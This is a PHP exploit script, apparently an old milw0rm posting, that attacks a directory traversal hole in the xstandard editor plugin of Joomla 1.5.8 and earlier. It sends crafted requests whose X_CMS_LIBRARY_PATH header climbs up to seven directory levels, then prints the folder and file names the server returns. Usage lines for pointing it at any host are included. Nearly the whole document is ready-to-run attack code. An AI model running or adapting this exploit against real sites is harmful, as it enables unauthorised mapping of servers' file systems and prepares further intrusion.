<?php
/*
 Joomla <= 1.5.8 (xstandard editor) Local Directory Traversal Vulnerability
 
 discovered by: irk4z[at]yahoo.pl
 greets: all friends ;) 
*/

echo "* Joomla <= 1.5.8 (xstandard editor) Local Directory Traversal Vuln\n";
echo "* discovered by: irk4z[at]yahoo.pl\n";
echo "*\n";
echo "* greets: all friends ;) enjoy!\n";
echo "*------------------------------------------------------------------*\n";

$host = $argv[1];
$path = $argv[2];
$folder = $argv[3];

if (empty($host) || empty($path)) {
	echo "usage: php {$argv[0]} <host> <path> [<folder>]\n";
	echo "       php {$argv[0]} example.org /joomla\n";
	echo "       php {$argv[0]} example.org /joomla ../../\n";
	exit;
}

echo "http://" . $host . $path . "/images/stories/\n\n";

if ( empty($folder) ){
	$lev = "./";
	for( $i = 0; $i <= 7; $i++ ) {
		echo browseFolder($host, $path, $lev);
		$lev .= "../";
	}
} else {
	echo browseFolder($host, $path, $folder);
}

function browseFolder($host, $path, $folder){
	
	$packet = "GET {$path}/plugins/editors/xstandard/attachmentlibrary.php HTTP/1.1\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "X_CMS_LIBRARY_PATH: {$folder}\r\n";
	$packet .= "Connection: Close\r\n\r\n";

	$o = @fsockopen($host, 80);
	if(!$o){
		echo "\n[x] No response...\n";
		die;
	}
	
	fputs($o, $packet);
	while (!feof($o)) $data .= fread($o, 1024);
	fclose($o);
	
	$_404 = strstr( $data, "HTTP/1.1 404 Not Found" );
	if ( !empty($_404) ){
		echo "\n[x] 404 Not Found... Maybe wrong path? \n";
		die;
	}
	
	//folders
	preg_match_all("/<baseURL>([^<]+)<\/baseURL>/", $data, $matches);
	//files
	preg_match_all("/<value>([^<]+\.[^<]{3,4})<\/value>/", $data, $matches2);
	
	$matches = array_merge( $matches[1], $matches2[1] );
	
	if ( empty($matches) ){
		$ret = "$folder [x] Failed...\n";
	} else {
		$ret = '';
		foreach( $matches as $tmp){
			$ret .= str_replace("images/stories/", '', str_replace("/./", "/", str_replace("//", "/", urldecode($tmp) ) ) ) . "\n";
		}
	}
	
	return ($ret);
}

?>

# milw0rm.com [2009-01-07]
